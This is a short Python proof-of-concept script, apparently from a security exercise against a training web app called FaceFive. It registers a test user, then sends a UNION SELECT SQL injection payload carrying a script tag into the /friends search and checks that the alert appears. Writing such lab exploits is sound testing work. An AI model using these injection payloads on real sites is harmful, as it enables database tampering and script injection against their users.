# vuln10.py

# PoC for SQL injection and XSS on the /friends endpoint
#
# The search bar allows for a SQL injection with a script in a SELECT query.

from tools import *
import sys
import os

debug = 'DEBUG' in os.environ and os.environ['DEBUG'] == '1'

url = sys.argv[1]

session = FaceFiveSession(url)

user = 'test'
passwd = 'testpasswd'

reset_image(session)
register(session, user, passwd)

payload = "\'and 1=0 union select '<script>alert(1)</script>', 2, 3, 4, 5 -- "

alertText = search_friends_script(session, payload)
assert "1" in alertText
